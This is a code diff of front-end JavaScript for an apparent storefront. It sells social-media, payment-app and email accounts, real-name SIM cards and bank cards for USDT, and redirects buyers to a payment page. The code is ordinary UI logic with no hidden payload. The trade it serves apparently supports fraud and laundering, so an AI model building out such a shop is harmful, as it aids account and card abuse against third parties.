+            document.getElementById('selectedAccountInfo').style.display = 'none';
+            document.getElementById('specialFields').style.display = 'none';
+            document.getElementById('rechargeFields').style.display = 'none';
+            document.getElementById('normalFields').style.display = 'block';
+        }
+
+        function backToTelegramList() {
+            document.getElementById('regionSelection').style.display = 'none';
+            document.getElementById('telegram_twitterAccounts').style.display = 'block';
+        }
+
+        function backToAccountList() {
+            document.getElementById('accountUserForm').style.display = 'none';
+            document.getElementById(selectedAccountType + 'Accounts').style.display = 'block';
+            document.getElementById('selectedAccountInfo').style.display = 'block';
+            document.getElementById('specialFields').style.display = 'none';
+            document.getElementById('rechargeFields').style.display = 'none';
+            document.getElementById('normalFields').style.display = 'block';
+        }
+
+        function selectRegion(type) {
+            document.getElementById('telegram_twitterAccounts').style.display = 'none';
+            document.getElementById('regionSelection').style.display = 'block';
+        }
+
+        function selectAccount(type, name, price) {
+            selectedAccount = {
+                type: type,
+                name: name,
+                price: price
+            };
+            
+            document.getElementById('selectedAccountName').textContent = name;
+            document.getElementById('selectedAccountPrice').textContent = price + ' USDT';
+            
+            let typeName = '';
+            switch(type) {
+                case 'telegram_twitter': typeName = 'Telegram/推特账号'; break;
+                case 'tiktok_kuaishou': typeName = 'TikTok抖音/快手账号'; break;
+                case 'xianyu_xiaohongshu': typeName = '闲鱼/小红书账号'; break;
+                case 'alipaywechat': typeName = '支付宝微信账号'; break;
+                case 'qqjd': typeName = 'QQ/京东账号'; break;
+                case 'whatsappfacebook': typeName = 'WhatsApp/Facebook账号'; break;
+                case 'apple': typeName = '苹果海外ID'; break;
+                case 'phone': typeName = '实名卡+话费充值'; break;
+                case 'bankcard': typeName = '银行卡/车队卡'; break;
+                case 'gmail_youtube': typeName = 'Gmail/YouTube账号'; break;
+                case 'tantan_momo': typeName = '探探/陌陌账号'; break;
+            }
+            document.getElementById('selectedAccountType').textContent = typeName;
+            
+            document.getElementById('selectedAccountInfo').style.display = 'block';
+            document.getElementById('accountTypes').style.display = 'none';
+            document.getElementById(type + 'Accounts').style.display = 'none';
+            document.getElementById('regionSelection').style.display = 'none';
+            
+            updateAccountTotalPrice();
+            
+            document.getElementById('specialFields').style.display = 'none';
+            document.getElementById('rechargeFields').style.display = 'none';
+            document.getElementById('normalFields').style.display = 'block';
+            
+            if (type === 'phone') {
+                if (name.includes('话费')) {
+                    document.getElementById('accountFormTitle').textContent = '填写充值信息';
+                    document.getElementById('specialFields').style.display = 'none';
+                    document.getElementById('rechargeFields').style.display = 'block';
+                    document.getElementById('normalFields').style.display = 'none';
                 } else {
-                    header.innerHTML = `
-                        <h1 class="account-header">各类平台账号购买</h1>
-                        <p>全网最低价，最牛售后</p>
-                    `;
-                    updateFeatures('account');
-                }
-                
-                resetForms();
-                
-                if (service === 'account') {
-                    backToAccountTypes();
-                }
-            }
-
-            function updateFeatures(service) {
-                const featuresContainer = document.getElementById('serviceFeatures');
-                if (service === 'premium') {
-                    featuresContainer.innerHTML = `
-                        <div class="feature">
-                            <div class="feature-icon">
-                                <img src="https://i.ibb.co/4nWVZXSp/open-folder-file-icon-219486.png" alt="更大文件上传" onerror="this.style.display='none'; this.parentNode.innerHTML='📁';">
-                            </div>
-                            <h3>更大文件上传</h3>
-                            <p>上传最大 4GB 的文件</p>
-                        </div>
-                        
-                        <div class="feature">
-                            <div class="feature-icon">
-                                <img src="https://i.ibb.co/C58QKWSM/1695711361784527.jpg" alt="更快的下载速度" onerror="this.style.display='none'; this.parentNode.innerHTML='⚡';">
-                            </div>
-                            <h3>更快的下载速度</h3>
-                            <p>享受无限制的下载速度</p>
-                        </div>
-                        
-                        <div class="feature">
-                            <div class="feature-icon">
-                                <img src="https://i.ibb.co/whwVyw5b/Telegram-logo-svg.webp" alt="专属贴纸" onerror="this.style.display='none'; this.parentNode.innerHTML='🎨';">
-                            </div>
-                            <h3>专属贴纸</h3>
-                            <p>使用 Premium 专属动画贴纸</p>
-                        </div>
-                        
-                        <div class="feature">
-                            <div class="feature-icon">
-                                <img src="https://i.ibb.co/XZKJLw9b/photo-2025-10-31-23-15-28.jpg" alt="高级聊天管理" onerror="this.style.display='none'; this.parentNode.innerHTML='💬';">
-                            </div>
-                            <h3>高级聊天管理</h3>
-                            <p>创建群组链接和更多管理工具</p>
-                        </div>
-                    `;
-                } else if (service === 'trx') {
-                    featuresContainer.innerHTML = `
-                        <div class="feature">
-                            <div class="feature-icon">
-                                <img src="https://i.ibb.co/Xk6SMFcs/tron-trx-icon3386-logowik-com.webp" alt="免手续费转账" onerror="this.style.display='none'; this.parentNode.innerHTML='🚀';">
-                            </div>
-                            <h3>免手续费转账</h3>
-                            <p>享受完全免费的TRON网络转账</p>
-                        </div>
-                        
-                        <div class="feature">
-                            <div class="feature-icon">
-                                <img src="https://i.ibb.co/Sw1m5Mc1/5c8399712069f697cf58e04be35a4caa.png" alt="高速交易" onerror="this.style.display='none'; this.parentNode.innerHTML='⚡';">
-                            </div>
-                            <h3>高速交易</h3>
-                            <p>交易确认速度提升至秒级</p>
-                        </div>
-                        
-                        <div class="feature">
-                            <div class="feature-icon">
-                                <img src="https://i.ibb.co/N6b50mVV/images.png" alt="稳定可靠" onerror="this.style.display='none'; this.parentNode.innerHTML='🛡️';">
-                            </div>
-                            <h3>稳定可靠</h3>
-                            <p>持续能量支持，交易永不中断</p>
-                        </div>
-                        
-                        <div class="feature">
-                            <div class="feature-icon">
-                                <img src="https://i.ibb.co/JWTqyVtH/image1s.jpg" alt="成本节约" onerror="this.style.display='none'; this.parentNode.innerHTML='💰';">
-                            </div>
-                            <h3>成本节约</h3>
-                            <p>大幅降低日常交易成本</p>
-                        </div>
-                    `;
-                } else {
-                    featuresContainer.innerHTML = '';
-                }
-            }
-
-            function resetForms() {
-                document.getElementById('userForm').style.display = 'none';
-                document.getElementById('walletSection').style.display = 'none';
-                document.getElementById('purchaseBtn').style.display = 'block';
-                document.getElementById('premiumCopyContainer').style.display = 'none';
-                
-                document.getElementById('trxUserForm').style.display = 'none';
-                document.getElementById('trxWalletSection').style.display = 'none';
-                document.getElementById('trxPurchaseBtn').style.display = 'block';
-                document.getElementById('trxCopyContainer').style.display = 'none';
-                
-                document.getElementById('accountUserForm').style.display = 'none';
-                document.getElementById('accountWalletSection').style.display = 'none';
-                document.getElementById('accountCopyContainer').style.display = 'none';
-                document.getElementById('selectedAccountInfo').style.display = 'none';
-                document.getElementById('regionSelection').style.display = 'none';
-                document.getElementById('specialFields').style.display = 'none';
-                document.getElementById('rechargeFields').style.display = 'none';
-                document.getElementById('normalFields').style.display = 'block';
-            }
-
-            function selectAccountType(type) {
-                selectedAccountType = type;
-                
-                const accountLists = document.querySelectorAll('.account-list');
-                accountLists.forEach(list => {
-                    list.style.display = 'none';
-                });
-                document.getElementById('regionSelection').style.display = 'none';
-                
-                document.getElementById(type + 'Accounts').style.display = 'block';
-                
-                document.getElementById('accountTypes').style.display = 'none';
-                
-                document.getElementById('selectedAccountInfo').style.display = 'none';
-                
-                // 重置子类型按钮状态
-                if (type === 'telegram_twitter') {
-                    showTelegramTwitterSubtype('telegram');
-                } else if (type === 'tiktok_kuaishou') {
-                    showTiktokKuaishouSubtype('tiktok');
-                } else if (type === 'xianyu_xiaohongshu') {
-                    showXianyuXiaohongshuSubtype('xianyu');
-                } else if (type === 'alipaywechat') {
-                    showAlipayWechatSubtype('alipay');
-                } else if (type === 'qqjd') {
-                    showQQJDSubtype('qq');
-                } else if (type === 'whatsappfacebook') {
-                    showWhatsAppFacebookSubtype('whatsapp');
-                } else if (type === 'phone') {
-                    showPhoneSubtype('liuliang');
-                } else if (type === 'gmail_youtube') {
-                    showGmailYouTubeSubtype('gmail');
-                } else if (type === 'tantan_momo') {
-                    showTantanMomoSubtype('tantan');
-                }
-            }
-
-            function backToAccountTypes() {
-                selectedAccountType = '';
-                selectedAccount = null;
-                
-                const accountLists = document.querySelectorAll('.account-list');
-                accountLists.forEach(list => {
-                    list.style.display = 'none';
-                });
-                document.getElementById('regionSelection').style.display = 'none';
-                
-                document.getElementById('accountTypes').style.display = 'grid';
-                
-                document.getElementById('accountUserForm').style.display = 'none';
-                document.getElementById('accountWalletSection').style.display = 'none';
-                document.getElementById('selectedAccountInfo').style.display = 'none';
-                document.getElementById('specialFields').style.display = 'none';
-                document.getElementById('rechargeFields').style.display = 'none';
-                document.getElementById('normalFields').style.display = 'block';
-            }
-
-            function backToTelegramList() {
-                document.getElementById('regionSelection').style.display = 'none';
-                document.getElementById('telegram_twitterAccounts').style.display = 'block';
-            }
-
-            function backToAccountList() {
-                document.getElementById('accountUserForm').style.display = 'none';
-                document.getElementById(selectedAccountType + 'Accounts').style.display = 'block';
-                document.getElementById('selectedAccountInfo').style.display = 'block';
-                document.getElementById('specialFields').style.display = 'none';
-                document.getElementById('rechargeFields').style.display = 'none';
-                document.getElementById('normalFields').style.display = 'block';
-            }
-
-            function selectRegion(type) {
-                document.getElementById('telegram_twitterAccounts').style.display = 'none';
-                document.getElementById('regionSelection').style.display = 'block';
-            }
-
-            function selectAccount(type, name, price) {
-                selectedAccount = {
-                    type: type,
-                    name: name,
-                    price: price
-                };
-                
-                document.getElementById('selectedAccountName').textContent = name;
-                document.getElementById('selectedAccountPrice').textContent = price + ' USDT';
-                
-                let typeName = '';
-                switch(type) {
-                    case 'telegram_twitter': typeName = 'Telegram/推特账号'; break;
-                    case 'tiktok_kuaishou': typeName = 'TikTok抖音/快手账号'; break;
-                    case 'xianyu_xiaohongshu': typeName = '闲鱼/小红书账号'; break;
-                    case 'alipaywechat': typeName = '支付宝微信账号'; break;
-                    case 'qqjd': typeName = 'QQ/京东账号'; break;
-                    case 'whatsappfacebook': typeName = 'WhatsApp/Facebook账号'; break;
-                    case 'apple': typeName = '苹果海外ID'; break;
-                    case 'phone': typeName = '实名卡+话费充值'; break;
-                    case 'bankcard': typeName = '银行卡/车队卡'; break;
-                    case 'gmail_youtube': typeName = 'Gmail/YouTube账号'; break;
-                    case 'tantan_momo': typeName = '探探/陌陌账号'; break;
-                }
-                document.getElementById('selectedAccountType').textContent = typeName;
-                
-                document.getElementById('selectedAccountInfo').style.display = 'block';
-                document.getElementById('accountTypes').style.display = 'none';
-                document.getElementById(type + 'Accounts').style.display = 'none';
-                document.getElementById('regionSelection').style.display = 'none';
-                
-                // 更新价格显示
-                updateAccountTotalPrice();
-                
-                // 重置所有字段显示
-                document.getElementById('specialFields').style.display = 'none';
-                document.getElementById('rechargeFields').style.display = 'none';
-                document.getElementById('normalFields').style.display = 'block';
-                
-                // 根据商品类型显示不同的字段
-                if (type === 'phone') {
-                    if (name.includes('话费')) {
-                        // 话费充值
-                        document.getElementById('accountFormTitle').textContent = '填写充值信息';
-                        document.getElementById('specialFields').style.display = 'none';
-                        document.getElementById('rechargeFields').style.display = 'block';
-                        document.getElementById('normalFields').style.display = 'none';
-                    } else {
-                        // 实名卡
-                        document.getElementById('accountFormTitle').textContent = '填写收货信息';
-                        document.getElementById('specialFields').style.display = 'block';
-                        document.getElementById('rechargeFields').style.display = 'none';
-                        document.getElementById('normalFields').style.display = 'none';
-                    }
-                } else if (type === 'bankcard') {
-                    // 银行卡
                     document.getElementById('accountFormTitle').textContent = '填写收货信息';
                     document.getElementById('specialFields').style.display = 'block';
                     document.getElementById('rechargeFields').style.display = 'none';
                     document.getElementById('normalFields').style.display = 'none';
+                }
+            } else if (type === 'bankcard') {
+                document.getElementById('accountFormTitle').textContent = '填写收货信息';
+                document.getElementById('specialFields').style.display = 'block';
+                document.getElementById('rechargeFields').style.display = 'none';
+                document.getElementById('normalFields').style.display = 'none';
+            } else {
+                document.getElementById('accountFormTitle').textContent = '填写接收信息';
+                document.getElementById('specialFields').style.display = 'none';
+                document.getElementById('rechargeFields').style.display = 'none';
+                document.getElementById('normalFields').style.display = 'block';
+            }
+            
+            document.getElementById('accountUserForm').style.display = 'block';
+        }
+
+        function updateAccountTotalPrice() {
+            if (selectedAccount) {
+                const quantity = document.getElementById('quantity').value;
+                const totalPrice = (selectedAccount.price * quantity).toFixed(2);
+                document.getElementById('accountPriceDisplay').textContent = totalPrice;
+                document.getElementById('selectedAccountPrice').textContent = totalPrice + ' USDT';
+            }
+        }
+
+        function searchAccounts(type, query) {
+            const accountItems = document.querySelectorAll(`#${type}Accounts .account-item`);
+            accountItems.forEach(item => {
+                const title = item.querySelector('.account-item-title').textContent.toLowerCase();
+                if (title.includes(query.toLowerCase())) {
+                    item.style.display = 'flex';
                 } else {
-                    // 普通账号
-                    document.getElementById('accountFormTitle').textContent = '填写接收信息';
-                    document.getElementById('specialFields').style.display = 'none';
-                    document.getElementById('rechargeFields').style.display = 'none';
-                    document.getElementById('normalFields').style.display = 'block';
+                    item.style.display = 'none';
+                }
+            });
+        }
+
+        // ==================== 子类型切换函数 ====================
+        function showTelegramTwitterSubtype(subtype) {
+            document.querySelectorAll('#telegram_twitterAccounts .subtype-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            document.querySelector(`#telegram_twitterAccounts .subtype-btn:nth-child(${subtype === 'telegram' ? 1 : 2})`).classList.add('active');
+            
+            document.getElementById('telegramSection').style.display = subtype === 'telegram' ? 'block' : 'none';
+            document.getElementById('twitterSection').style.display = subtype === 'twitter' ? 'block' : 'none';
+        }
+
+        function showTiktokKuaishouSubtype(subtype) {
+            document.querySelectorAll('#tiktok_kuaishouAccounts .subtype-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            document.querySelector(`#tiktok_kuaishouAccounts .subtype-btn:nth-child(${subtype === 'tiktok' ? 1 : 2})`).classList.add('active');
+            
+            document.getElementById('tiktokSection').style.display = subtype === 'tiktok' ? 'block' : 'none';
+            document.getElementById('kuaishouSection').style.display = subtype === 'kuaishou' ? 'block' : 'none';
+        }
+
+        function showXianyuXiaohongshuSubtype(subtype) {
+            document.querySelectorAll('#xianyu_xiaohongshuAccounts .subtype-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            document.querySelector(`#xianyu_xiaohongshuAccounts .subtype-btn:nth-child(${subtype === 'xianyu' ? 1 : 2})`).classList.add('active');
+            
+            document.getElementById('xianyuSection').style.display = subtype === 'xianyu' ? 'block' : 'none';
+            document.getElementById('xiaohongshuSection').style.display = subtype === 'xiaohongshu' ? 'block' : 'none';
+        }
+
+        function showAlipayWechatSubtype(subtype) {
+            document.querySelectorAll('#alipaywechatAccounts .subtype-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            document.querySelector(`#alipaywechatAccounts .subtype-btn:nth-child(${subtype === 'alipay' ? 1 : 2})`).classList.add('active');
+            
+            document.getElementById('alipaySection').style.display = subtype === 'alipay' ? 'block' : 'none';
+            document.getElementById('wechatSection').style.display = subtype === 'wechat' ? 'block' : 'none';
+        }
+
+        function showQQJDSubtype(subtype) {
+            document.querySelectorAll('#qqjdAccounts .subtype-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            document.querySelector(`#qqjdAccounts .subtype-btn:nth-child(${subtype === 'qq' ? 1 : 2})`).classList.add('active');
+            
+            document.getElementById('qqSection').style.display = subtype === 'qq' ? 'block' : 'none';
+            document.getElementById('jdSection').style.display = subtype === 'jd' ? 'block' : 'none';
+        }
+
+        function showWhatsAppFacebookSubtype(subtype) {
+            document.querySelectorAll('#whatsappfacebookAccounts .subtype-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            document.querySelector(`#whatsappfacebookAccounts .subtype-btn:nth-child(${subtype === 'whatsapp' ? 1 : 2})`).classList.add('active');
+            
+            document.getElementById('whatsappSection').style.display = subtype === 'whatsapp' ? 'block' : 'none';
+            document.getElementById('facebookSection').style.display = subtype === 'facebook' ? 'block' : 'none';
+        }
+
+        function showPhoneSubtype(subtype) {
+            document.querySelectorAll('#phoneAccounts .subtype-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            const index = subtype === 'liuliang' ? 1 : subtype === 'shiming' ? 2 : 3;
+            document.querySelector(`#phoneAccounts .subtype-btn:nth-child(${index})`).classList.add('active');
+            
+            document.getElementById('liuliangSection').style.display = subtype === 'liuliang' ? 'block' : 'none';
+            document.getElementById('shimingSection').style.display = subtype === 'shiming' ? 'block' : 'none';
+            document.getElementById('huafeiSection').style.display = subtype === 'huafei' ? 'block' : 'none';
+        }
+
+        function showGmailYouTubeSubtype(subtype) {
+            document.querySelectorAll('#gmail_youtubeAccounts .subtype-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            document.querySelector(`#gmail_youtubeAccounts .subtype-btn:nth-child(${subtype === 'gmail' ? 1 : 2})`).classList.add('active');
+            
+            document.getElementById('gmailSection').style.display = subtype === 'gmail' ? 'block' : 'none';
+            document.getElementById('youtubeSection').style.display = subtype === 'youtube' ? 'block' : 'none';
+        }
+
+        function showTantanMomoSubtype(subtype) {
+            document.querySelectorAll('#tantan_momoAccounts .subtype-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            document.querySelector(`#tantan_momoAccounts .subtype-btn:nth-child(${subtype === 'tantan' ? 1 : 2})`).classList.add('active');
+            
+            document.getElementById('tantanSection').style.display = subtype === 'tantan' ? 'block' : 'none';
+            document.getElementById('momoSection').style.display = subtype === 'momo' ? 'block' : 'none';
+        }
+
+        // ==================== 支付URL生成 ====================
+        function generatePaymentUrl(service) {
+            let quantity = 1;
+            
+            if (service === 'premium') {
+                const username = document.getElementById('username').value.trim();
+                const nickname = document.getElementById('nickname').value.trim();
+                
+                if (!username || !nickname) {
+                    showTemporaryMessage('请先填写用户信息！');
+                    return null;
                 }
                 
-                document.getElementById('accountUserForm').style.display = 'block';
-            }
-
-            function updateAccountTotalPrice() {
-                if (selectedAccount) {
-                    const quantity = document.getElementById('quantity').value;
-                    const totalPrice = (selectedAccount.price * quantity).toFixed(2);
-                    document.getElementById('accountPriceDisplay').textContent = totalPrice;
-                    document.getElementById('selectedAccountPrice').textContent = totalPrice + ' USDT';
+                const orderId = 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
+                const paymentUrl = `payment.html?orderId=${orderId}&username=${encodeURIComponent(username)}&nickname=${encodeURIComponent(nickname)}&amount=0.99&service=premium&quantity=1`;
+                return paymentUrl;
+            } else if (service === 'trx') {
+                const trxAddress = document.getElementById('trxAddress').value.trim();
+                
+                if (!trxAddress) {
+                    showTemporaryMessage('请先填写钱包地址！');
+                    return null;
                 }
-            }
-
-            function searchAccounts(type, query) {
-                const accountItems = document.querySelectorAll(`#${type}Accounts .account-item`);
-                accountItems.forEach(item => {
-                    const title = item.querySelector('.account-item-title').textContent.toLowerCase();
-                    if (title.includes(query.toLowerCase())) {
-                        item.style.display = 'flex';
+                
+                const orderId = 'TRX' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
+                const paymentUrl = `payment.html?orderId=${orderId}&trxAddress=${encodeURIComponent(trxAddress)}&amount=1.99&service=trx&quantity=1`;
+                return paymentUrl;
+            } else if (service === 'account') {
+                if (!selectedAccount) {
+                    showTemporaryMessage('请先选择账号！');
+                    return null;
+                }
+                
+                const orderId = 'ACC' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
+                const accountNote = document.getElementById('accountNote').value.trim();
+                quantity = document.getElementById('quantity').value.trim();
+                const totalAmount = (selectedAccount.price * quantity).toFixed(2);
+                
+                let paymentUrl = `payment.html?orderId=${orderId}&accountNote=${encodeURIComponent(accountNote)}&accountType=${encodeURIComponent(selectedAccount.type)}&accountName=${encodeURIComponent(selectedAccount.name)}&amount=${totalAmount}&service=account&quantity=${quantity}`;
+                
+                if (selectedAccount.type === 'phone') {
+                    if (selectedAccount.name.includes('话费')) {
+                        const rechargePhone = document.getElementById('rechargePhone').value.trim();
+                        const operator = document.getElementById('operator').value.trim();
+                        paymentUrl += `&rechargePhone=${encodeURIComponent(rechargePhone)}&operator=${encodeURIComponent(operator)}`;
                     } else {
-                        item.style.display = 'none';
+                        const contactName = document.getElementById('contactName').value.trim();
+                        const shippingAddress = document.getElementById('shippingAddress').value.trim();
+                        const shippingPhone = document.getElementById('shippingPhone').value.trim();
+                        paymentUrl += `&contactName=${encodeURIComponent(contactName)}&shippingAddress=${encodeURIComponent(shippingAddress)}&shippingPhone=${encodeURIComponent(shippingPhone)}`;
                     }
-                });
+                } else if (selectedAccount.type === 'bankcard') {
+                    const contactName = document.getElementById('contactName').value.trim();
+                    const shippingAddress = document.getElementById('shippingAddress').value.trim();
+                    const shippingPhone = document.getElementById('shippingPhone').value.trim();
+                    paymentUrl += `&contactName=${encodeURIComponent(contactName)}&shippingAddress=${encodeURIComponent(shippingAddress)}&shippingPhone=${encodeURIComponent(shippingPhone)}`;
+                } else {
+                    const accountEmail = document.getElementById('accountEmail').value.trim();
+                    paymentUrl += `&accountEmail=${encodeURIComponent(accountEmail)}`;
+                }
+                
+                return paymentUrl;
             }
+        }
 
-            // 子类型切换函数
-            function showTelegramTwitterSubtype(subtype) {
-                document.querySelectorAll('#telegram_twitterAccounts .subtype-btn').forEach(btn => {
-                    btn.classList.remove('active');
-                });
-                document.querySelector(`#telegram_twitterAccounts .subtype-btn:nth-child(${subtype === 'telegram' ? 1 : 2})`).classList.add('active');
-                
-                document.getElementById('telegramSection').style.display = subtype === 'telegram' ? 'block' : 'none';
-                document.getElementById('twitterSection').style.display = subtype === 'twitter' ? 'block' : 'none';
+        // ==================== 核心：选择钱包并跳转 ====================
+        async function selectWallet(walletName, service) {
+            selectedWallet = walletName;
+            
+            console.log(`🎯 选择钱包: ${walletName}, 服务: ${service}`);
+            
+            // 生成支付URL
+            const paymentUrl = generatePaymentUrl(service);
+            if (!paymentUrl) {
+                return;
             }
+            
+            currentPaymentUrl = paymentUrl;
+            console.log(`🔗 支付URL: ${currentPaymentUrl}`);
+            
+            // 直接跳转到 payment.html
+            window.location.href = currentPaymentUrl;
+        }
 
-            function showTiktokKuaishouSubtype(subtype) {
-                document.querySelectorAll('#tiktok_kuaishouAccounts .subtype-btn').forEach(btn => {
-                    btn.classList.remove('active');
-                });
-                document.querySelector(`#tiktok_kuaishouAccounts .subtype-btn:nth-child(${subtype === 'tiktok' ? 1 : 2})`).classList.add('active');
+        // ==================== DOM加载完成 ====================
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('purchaseBtn').addEventListener('click', function() {
+                document.getElementById('userForm').style.display = 'block';
+                this.style.display = 'none';
+            });
+            
+            document.getElementById('confirmBtn').addEventListener('click', function() {
+                const username = document.getElementById('username').value.trim();
+                const nickname = document.getElementById('nickname').value.trim();
                 
-                document.getElementById('tiktokSection').style.display = subtype === 'tiktok' ? 'block' : 'none';
-                document.getElementById('kuaishouSection').style.display = subtype === 'kuaishou' ? 'block' : 'none';
-            }
-
-            function showXianyuXiaohongshuSubtype(subtype) {
-                document.querySelectorAll('#xianyu_xiaohongshuAccounts .subtype-btn').forEach(btn => {
-                    btn.classList.remove('active');
-                });
-                document.querySelector(`#xianyu_xiaohongshuAccounts .subtype-btn:nth-child(${subtype === 'xianyu' ? 1 : 2})`).classList.add('active');
+                if (!username || !nickname) {
+                    showTemporaryMessage('请填写完整的用户信息！');
+                    return;
+                }
                 
-                document.getElementById('xianyuSection').style.display = subtype === 'xianyu' ? 'block' : 'none';
-                document.getElementById('xiaohongshuSection').style.display = subtype === 'xiaohongshu' ? 'block' : 'none';
-            }
-
-            function showAlipayWechatSubtype(subtype) {
-                document.querySelectorAll('#alipaywechatAccounts .subtype-btn').forEach(btn => {
-                    btn.classList.remove('active');
-                });
-                document.querySelector(`#alipaywechatAccounts .subtype-btn:nth-child(${subtype === 'alipay' ? 1 : 2})`).classList.add('active');
+                if (!username.startsWith('@')) {
+                    showTemporaryMessage('用户名必须以 @ 开头');
+                    return;
+                }
                 
-                document.getElementById('alipaySection').style.display = subtype === 'alipay' ? 'block' : 'none';
-                document.getElementById('wechatSection').style.display = subtype === 'wechat' ? 'block' : 'none';
-            }
-
-            function showQQJDSubtype(subtype) {
-                document.querySelectorAll('#qqjdAccounts .subtype-btn').forEach(btn => {
-                    btn.classList.remove('active');
-                });
-                document.querySelector(`#qqjdAccounts .subtype-btn:nth-child(${subtype === 'qq' ? 1 : 2})`).classList.add('active');
+                document.getElementById('walletSection').style.display = 'block';
+                document.getElementById('userForm').style.display = 'none';
                 
-                document.getElementById('qqSection').style.display = subtype === 'qq' ? 'block' : 'none';
-                document.getElementById('jdSection').style.display = subtype === 'jd' ? 'block' : 'none';
-            }
+                if (!isInWalletBrowser()) {
+                    document.getElementById('premiumCopyContainer').style.display = 'block';
+                }
+            });
 
-            function showWhatsAppFacebookSubtype(subtype) {
-                document.querySelectorAll('#whatsappfacebookAccounts .subtype-btn').forEach(btn => {
-                    btn.classList.remove('active');
-                });
-                document.querySelector(`#whatsappfacebookAccounts .subtype-btn:nth-child(${subtype === 'whatsapp' ? 1 : 2})`).classList.add('active');
+            document.getElementById('trxPurchaseBtn').addEventListener('click', function() {
+                document.getElementById('trxUserForm').style.display = 'block';
+                this.style.display = 'none';
+            });
+            
+            document.getElementById('trxConfirmBtn').addEventListener('click', function() {
+                const trxAddress = document.getElementById('trxAddress').value.trim();
                 
-                document.getElementById('whatsappSection').style.display = subtype === 'whatsapp' ? 'block' : 'none';
-                document.getElementById('facebookSection').style.display = subtype === 'facebook' ? 'block' : 'none';
-            }
-
-            function showPhoneSubtype(subtype) {
-                document.querySelectorAll('#phoneAccounts .subtype-btn').forEach(btn => {
-                    btn.classList.remove('active');
-                });
-                const index = subtype === 'liuliang' ? 1 : subtype === 'shiming' ? 2 : 3;
-                document.querySelector(`#phoneAccounts .subtype-btn:nth-child(${index})`).classList.add('active');
+                if (!trxAddress) {
+                    showTemporaryMessage('请填写钱包地址！');
+                    return;
+                }
                 
-                document.getElementById('liuliangSection').style.display = subtype === 'liuliang' ? 'block' : 'none';
-                document.getElementById('shimingSection').style.display = subtype === 'shiming' ? 'block' : 'none';
-                document.getElementById('huafeiSection').style.display = subtype === 'huafei' ? 'block' : 'none';
-            }
-
-            // 新增的子类型切换函数
-            function showGmailYouTubeSubtype(subtype) {
-                document.querySelectorAll('#gmail_youtubeAccounts .subtype-btn').forEach(btn => {
-                    btn.classList.remove('active');
-                });
-                document.querySelector(`#gmail_youtubeAccounts .subtype-btn:nth-child(${subtype === 'gmail' ? 1 : 2})`).classList.add('active');
+                if (!trxAddress.startsWith('T')) {
+                    showTemporaryMessage('TRON钱包地址必须以 T 开头');
+                    return;
+                }
                 
-                document.getElementById('gmailSection').style.display = subtype === 'gmail' ? 'block' : 'none';
-                document.getElementById('youtubeSection').style.display = subtype === 'youtube' ? 'block' : 'none';
-            }
-
-            function showTantanMomoSubtype(subtype) {
-                document.querySelectorAll('#tantan_momoAccounts .subtype-btn').forEach(btn => {
-                    btn.classList.remove('active');
-                });
-                document.querySelector(`#tantan_momoAccounts .subtype-btn:nth-child(${subtype === 'tantan' ? 1 : 2})`).classList.add('active');
+                document.getElementById('trxWalletSection').style.display = 'block';
+                document.getElementById('trxUserForm').style.display = 'none';
                 
-                document.getElementById('tantanSection').style.display = subtype === 'tantan' ? 'block' : 'none';
-                document.getElementById('momoSection').style.display = subtype === 'momo' ? 'block' : 'none';
-            }
+                if (!isInWalletBrowser()) {
+                    document.getElementById('trxCopyContainer').style.display = 'block';
+                }
+            });
 
-            document.addEventListener('DOMContentLoaded', function() {
-                document.getElementById('purchaseBtn').addEventListener('click', function() {
-                    document.getElementById('userForm').style.display = 'block';
-                    this.style.display = 'none';
-                });
+            document.getElementById('accountConfirmBtn').addEventListener('click', function() {
+                const quantity = document.getElementById('quantity').value.trim();
                 
-                document.getElementById('confirmBtn').addEventListener('click', function() {
-                    const username = document.getElementById('username').value.trim();
-                    const nickname = document.getElementById('nickname').value.trim();
-                    
-                    if (!username || !nickname) {
-                        showTemporaryMessage('请填写完整的用户信息！');
-                        return;
-                    }
-                    
-                    if (!username.startsWith('@')) {
-                        showTemporaryMessage('用户名必须以 @ 开头');
-                        return;
-                    }
-                    
-                    document.getElementById('walletSection').style.display = 'block';
-                    document.getElementById('userForm').style.display = 'none';
-                    
-                    if (!isInWalletBrowser()) {
-                        document.getElementById('premiumCopyContainer').style.display = 'block';
-                    }
-                });
-
-                document.getElementById('trxPurchaseBtn').addEventListener('click', function() {
-                    document.getElementById('trxUserForm').style.display = 'block';
-                    this.style.display = 'none';
-                });
+                if (!selectedAccount) {
+                    showTemporaryMessage('请选择要购买的账号！');
+                    return;
+                }
                 
-                document.getElementById('trxConfirmBtn').addEventListener('click', function() {
-                    const trxAddress = document.getElementById('trxAddress').value.trim();
-                    
-                    if (!trxAddress) {
-                        showTemporaryMessage('请填写钱包地址！');
-                        return;
-                    }
-                    
-                    if (!trxAddress.startsWith('T')) {
-                        showTemporaryMessage('TRON钱包地址必须以 T 开头');
-                        return;
-                    }
-                    
-                    document.getElementById('trxWalletSection').style.display = 'block';
-                    document.getElementById('trxUserForm').style.display = 'none';
-                    
-                    if (!isInWalletBrowser()) {
-                        document.getElementById('trxCopyContainer').style.display = 'block';
-                    }
-                });
-
-                document.getElementById('accountConfirmBtn').addEventListener('click', function() {
-                    const quantity = document.getElementById('quantity').value.trim();
-                    
-                    if (!selectedAccount) {
-                        showTemporaryMessage('请选择要购买的账号！');
-                        return;
-                    }
-                    
-                    if (!quantity || quantity < 1) {
-                        showTemporaryMessage('请填写正确的购买数量！');
-                        return;
-                    }
-                    
-                    // 验证不同商品类型的必填字段
-                    if (selectedAccount.type === 'phone') {
-                        if (selectedAccount.name.includes('话费')) {
-                            // 话费充值验证
-                            const rechargePhone = document.getElementById('rechargePhone').value.trim();
-                            if (!rechargePhone) {
-                                showTemporaryMessage('请填写充值电话！');
-                                return;
-                            }
-                        } else {
-                            // 实名卡验证
-                            const contactName = document.getElementById('contactName').value.trim();
